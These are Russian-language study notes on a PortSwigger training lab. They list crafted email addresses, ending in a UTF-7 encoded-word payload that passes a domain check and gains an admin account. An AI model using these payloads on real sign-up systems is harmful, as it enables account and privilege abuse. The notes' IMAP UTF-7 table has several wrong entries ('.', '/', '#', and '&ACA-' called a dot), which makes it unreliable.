лаба про:

РЕГИСТРАЦИЯ - 2 АДРЕСА В ОДНОМ ИНПУТЕ - 
РЕГИСТРАЦИЯ ПО ОДНОМУ EMAIL
ПИСЬМО ПРИХОДИТ НА МОЙ  (ДРУГОЙ) EMAIL

-------

лаба https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies
##### Обход контроля доступа с использованием расхождений в анализе адресов электронной почты

обучающая статья
https://portswigger.net/research/splitting-the-email-atom

---
задание:
зарегать один почтовый адресс
и чтобы письмо с подтверждением пришло на мой почтовый адресс

-------

способы и примеры-  коротко

`oastify.com!collab\@example.com`  ! и \       для sendmail

`collab%psres.net(@example.com`  % вместо @ и (    для postfix

`❀`, вместо `@`    меняем собачку юникодом

`=?UTF-8?Q?=41=42=43?=@psres.net` декодируется в `ABC@psres.net`  (hex или base64)

другие кодировки  utf-7 итд

`"external@evil.com"@company.com`  ошибка в библиотеке nodemailer

`email.parser`  это багованный метод в питоне

unicode soft hyphen (`U+00AD`) "p-a-s-s-w-o-r-d" — бессмыслица. для пользователя в почтовом клиенте отображается как обычное "password"

подробнее смотреть здесь -> [[0-Business_logic_THEORY+email]]

------------

приступаю к лабе:

задание:
зарегать один почтовый адресс
и чтобы письмо с подтверждением пришло на мой почтовый адресс

в лабе сказано , что расширенный функционал аккаунта 
будет у юзеров со спец поят адресами заканчивающимися на @ginandjuice.shop

мои почтовый адресс это
` attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net`

------

и есть стандартные поля регистрации юзера Username Email и Password

---

создам пейлоады на основе теории как выше , из примеров

1)  `oastify.com!collab\@example.com`  ! и \

` ginandjuice.shop!attacker\@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net  `

2)  `collab%psres.net(@example.com`  % вместо @ и (

` attacker%exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net(@ginandjuice.shop  `

3)  `❀`, вместо `@`    меняем собачку юникодом

` attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net❀ginandjuice.shop  `
` attacker❀exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop  `
` attacker❀exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net❀ginandjuice.shop  `
` attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop  `



4)   hex кодировка - ерунда так как @ это 40
` attacker40exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop`
здесь письмо ушло - но не на мой емейл - и  ясно почему (тут же просто 40)


5)   base64 кодировка    @ это      QA==
` attackerQA==exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop`
письмо ушло - но не на мой емейл
` attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.netQA==ginandjuice.shop`
нет

6)   URL  кодировка      @ это   %40
` attacker%40exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop`
письмо ушло - но не на мой емейл
` attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net%40ginandjuice.shop`
нет



7)  html  кодировка      @ это      &#64;
` attacker&#64;exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop`

все текущие варианты не подошли.. думаю дальше 

-------

`attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net!ginandjuice.shop`
нет

`ginandjuice.shop!attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net`
нет

`ginandjuice.shop!attacker\@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net`
нет

`attacker%exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net(@ginandjuice.shop`
нет

`attacker%exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net\@ginandjuice.shop`
нет

`"attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net"@ginandjuice.shop`
нет

`attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net(@ginandjuice.shop)`
нет

-----

вот такой вариант нужно пробловать еще 
`=?UTF-8?Q?=41=42=43?=@psres.net` декодируется в `ABC@psres.net`  (hex или base64)

оригиналы
 @ginandjuice.shop
` attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net`

пейлоад

hex вариант
` 61747461636B6572406578706C6F69742D30616134303030303034636437636464383162303131366530313034303033652E6578706C6F69742D7365727665722E6E6574@ginandjuice.shop`
ответ Email is too large


вар base 64
` YXR0YWNrZXJAZXhwbG9pdC0wYWE0MDAwMDA0Y2Q3Y2RkODFiMDExNmUwMTA0MDAzZS5leHBsb2l0LXNlcnZlci5uZXQ=@ginandjuice.shop`
письмо ушло - но не на мой адрес

нужно понять че это за шляпа в образце `=?UTF-8?Q?=41=42=43?=` это такая таблица  UTF-8

это html - но слишком длинный - не пройдет по длинне
&#97;&#116;&#116;&#97;&#99;&#107;&#101;&#114;&#64;&#101;&#120;&#112;&#108;&#111;&#105;&#116;&#45;&#48;&#97;&#97;&#52;&#48;&#48;&#48;&#48;&#48;&#52;&#99;&#100;&#55;&#99;&#100;&#100;&#56;&#49;&#98;&#48;&#49;&#49;&#54;&#101;&#48;&#49;&#48;&#52;&#48;&#48;&#51;&#101;&#46;&#101;&#120;&#112;&#108;&#111;&#105;&#116;&#45;&#115;&#101;&#114;&#118;&#101;&#114;&#46;&#110;&#101;&#116;



пытаясь понять че это такое 
я проверил 
LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults, base64, hex,html

`=?UTF-8?Q?=41=42=43?=`  должно декодироваться в `ABC`


#### Структура   `=?UTF-8?Q?=41=42=43?=`:

- `=?` — начало кодировки
    
- `UTF-8` — кодировка символов (как сказал выше, UTF-8 это просто таблица)
    
- `?Q?` — тип кодировки: **Q** значит **Q-encoding** (это HEX, но с `=` вместо `%`)
    
- `=41=42=43` — сами закодированные данные
    
- `?=` — конец
   
#### а внутри:

- `=41` = HEX 0x41 = символ `A`
    
- `=42` = HEX 0x42 = символ `B`
    
- `=43` = HEX 0x43 = символ `C`


------

вот здесь есть таблица utf-8 https://www.utf8-chartable.de

то есть  закодировать @ в utf-8 то получается 40 число...

но как правильно вставить эти 40 ?


Почтовая библиотека (например, Ruby Mail) 
видит конструкцию `=?UTF-8?Q?=40?=`, раскодирует её обратно в `@`

оригиналы
 @ginandjuice.shop
` attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net`
 `=?UTF-8?Q?=40?=`  это @


пробую пейлоады

` attacker=?UTF-8?Q?=40?=exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop`

ответ: Registration blocked for security reasons  ЗАБЛОЧИЛ


 `=?UTF-8?Q?=40?=` в кодировке URL:
`%3D%3F%55%54%46%2D%38%3F%51%3F%3D%34%30%3F%3D`
пейлоад
` attacker%3D%3F%55%54%46%2D%38%3F%51%3F%3D%34%30%3F%3Dexploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop`
письмо ушло но не ко мне...

--------


может так  не 8 а 7 версия?
вот здесь посмотреть UTF-7 https://www.fileformat.info/info/charset/UTF-7/list.htm
там шляпа 

|@|[COMMERCIAL AT (U+0040)]|2b4145412d|

пробую пейлоады

` attacker=?UTF-7?Q?=40?=exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop`

ответ Registration blocked for security reasons  

разбор пейлоада:

| Часть               | Что это                                  | Статус          |
| ------------------- | ---------------------------------------- | --------------- |
| `attacker=`         | Твой юзернейм + знак равно               | ✅               |
| `?UTF-7?Q?`         | **ОШИБКА!** Смесь UTF-7 и Q-encoding     | ❌ проблема      |
| `=40`               | HEX-код символа `@` (это для Q-encoding) | ⚠️ Не для UTF-7 |
| `?=`                | Конец кодировки                          | ✅               |
| `exploit-...`       | Твой домен                               | ✅               |
| `@ginandjuice.shop` | Видимый домен                            | ✅               |

пейлоад 
` attacker2b4145412dexploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net@ginandjuice.shop`
письмо ушло - но не на мой адрес


------
ОКАЗЫВАЕТСЯ, _НУЖНО ПРАВИЛЬНО НАЧАТЬ СТРОКУ, _ ДАВ ПОНЯТЬ СИСТЕМЕ ,_ ЧТО БУДЕТ КОДИРОВКА


 сайт с кодировками  https://www.novel.tools/encode но мне он не помог


пейлоад 
```
=?utf-7?q?attacker&AEA-exploit-0aa4000004cd7cdd81b0116e0104003e&ACA-exploit-server&ACA-net?=@ginandjuice.shop
```
письмо ушло - но не на мой адрес
`&AEA-` это собачка

**Конкретно `&AEA-`:**

- `&` — начало Base64-блока
   
- `AEA` — это Base64-строка
   
- `-` — конец Base64-блока
-------

# IMAP UTF-7 (RFC 3501) 

`&AEA-` это собачка в кодировке IMAP UTF-7 (RFC 3501) 
IMAP UTF-7 (RFC 3501)  -это писец какая узкая кодировка...

здесь чуть больше инфы https://www.pythontutorials.net/blog/imap-folder-path-encoding-imap-utf-7-for-python/

| Часть пэйлоада                             | че означает                      |
| ------------------------------------------ | -------------------------------- |
| `=?utf-7?q?`                               | начало encoded-word с UTF-7      |
| `attacker`                                 | юзернейм (не кодируется)         |
| `&AEA-`                                    | закодированный символ `@`        |
| `exploit-0aa4000004cd7cdd81b0116e0104003e` | твой ID (не кодируется)          |
| `&ACA-`                                    | закодированная точка (первая)    |
| `exploit-server`                           | часть домена (не кодируется)     |
| `&ACA-`                                    | закодированная точка             |
| `net`                                      | окончание домена (не кодируется) |
| `?=`                                       | конец encoded-word               |
| `@ginandjuice.shop`                        | видимый для валидатора домен     |
`=?utf-7?q?`  начало  кодировки - тело - конец  кодировки `?=`

---

пейлоад 
`=?utf-7?q?attacker&AEA-0aa4000004cd7cdd81b0116e0104003e&ACA-exploit-server.net?=@ginandjuice.shop`
письмо ушло - но не на мой адрес

--------


ИЗ ОФИЦ РЕШЕНИЯ ПЕЙЛОАД

`=?utf-7?q?attacker&AEA-exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net&ACA-?=@ginandjuice.shop`

получил письмо 
подтвердил регистрацию
попал в ак, права в нем админские

удалил карлоса

#### ЛАБА РЕШЕНА!!!

###### определить подверженность сайта такой атаке можно только методом тыка

короче говоря,  пейлоад сработал потому что он использует расхождение в парсинге между разными системами 

сайт видит одно а почтовый сервер доставляет письмо совсем на другой адрес

сайт проверяет домен пользователя по тому что написано после последней собачки то есть `ginandjuice.shop` сайт думает что юзер с этого домена и дает ему расширенные права

но настоящий адрес для доставки письма формируется после декодирования части `=?utf-7?q?...?=` почтовая библиотека видит конструкцию encoded-word раскодирует её и получает `attacker@exploit-0aa4000004cd7cdd81b0116e0104003e.exploit-server.net` где `&AEA-` превращается в `@` а `&ACA-` в `:` но в данном случае `&ACA-` в конце просто  точка в utf-7 

в итоге письмо уходит мне а сайт считает что юзер с домена `ginandjuice.shop` и это позволяет обойти контроль доступа

------




### вот тут пооезная таблица с готовыми  древними кодировками IMAP UTF-7 (RFC 3501) 

### 1. (управляющие и специальные)

|Символ|Назначение|Кодировка в IMAP UTF-7|
|---|---|---|
|**`&`**|Сам амперсанд (нужен как текст)|**`&-`**|
|**`+`**|Плюс (в IMAP версии не управляющий, но может влиять)|`+` (остается как есть)|
|**`-`**|Минус (закрывает блок)|`-` (остается, если не внутри блока)|

### 2. КЛЮЧЕВЫЕ ДЛЯ АТАК 

|Символ|Unicode|Base64 (UTF-16BE)|Кодировка|Где применяется|
|---|---|---|---|---|
|**`@`**|U+0040|AEA=|**`&AEA-`**|Разделитель user/domain, основа обмана|
|**`:`**|U+003A|ADA=|**`&ADA-`**|Source routes (маршрутизация почты)|
|**`,`**|U+002C|ACM=|**`&ACM-`**|Разделитель в source routes|
|**`%`**|U+0025|ACU=|**`&ACU-`**|Percent hack (замена на @ в Postfix)|
|**`!`**|U+0021|ACE=|**`&ACE-`**|UUCP (восклицательный знак)|
|**`\`**|U+005C|AFw=|**`&AFw-`**|Экранирование (как в вашем примере с обратным слешем)|

### 3. ПОЛЕЗНЫЕ ДЛЯ ОБХОДА ФИЛЬТРОВ

|Символ|Unicode|Base64 (UTF-16BE)|Кодировка|Зачем|
|---|---|---|---|---|
|**`.`**|U+002E|AG4=|**`&AG4-`**|Точка в домене (если фильтр тупит)|
|**`/`**|U+002F|AG8=|**`&AG8-`**|Слеш (пути, редко)|
|**`#`**|U+0023|ACM= (ой, это же %? Проверим)|**`&ACM-`**|Хеш (реже, но бывает)|
|**`$`**|U+0024|ACQ=|**`&ACQ-`**|Доллар (ценники)|
|**`*`**|U+002A|ACg=|**`&ACg-`**|Звездочка (wildcard)|
|**`?`**|U+003F|AD8=|**`&AD8-`**|Вопрос (параметры)|

### 4. КИРИЛЛИЦА (если нужно подделать русский домен/имя)

|Символ|Unicode|Base64 (UTF-16BE)|Кодировка|
|---|---|---|---|
|**а**|U+0430|BDA=|**`&BDA-`**|
|**б**|U+0431|BDE=|**`&BDE-`**|
|**в**|U+0432|BDI=|**`&BDI-`**|
|**г**|U+0433|BDM=|**`&BDM-`**|
|... (дальше по алфавиту, но принцип ясен)||||

### 5. ПРОБЕЛ И ДРУГИЕ НЕВИДИМЫЕ

|Символ|Unicode|Base64 (UTF-16BE)|Кодировка|
|---|---|---|---|
|пробел|U+0020|ACA=|**`&ACA-`**|
|табуляция|U+0009|AAk=|**`&AAk-`**|
|перевод строки|U+000A|AAo=|**`&AAo-`**|



или вручную вот так можно кодировать 
```python
// Функция для получения IMAP UTF-7 одного символа
function getImapUtf7(char) {
    // Код символа в UTF-16BE (как 2 байта)
    let code = char.charCodeAt(0);
    // Старший и младший байт
    let highByte = (code >> 8) & 0xFF;
    let lowByte = code & 0xFF;
    
    // Превращаем в Base64 (имитация UTF-16BE)
    // На самом деле тут надо честное base64 от двух байт
    // Но для ASCII символов (код < 256) highByte = 0, lowByte = code
    // Тогда Base64 от [0, code] — это и есть наша таблица
    
    // Для не-ASCII придется честно кодировать, но для английских символов таблицы выше хватит
    console.log(`Символ: ${char} (U+${code.toString(16).toUpperCase()})`);
}
// Проверка
getImapUtf7('@'); // U+0040 → &AEA-
```


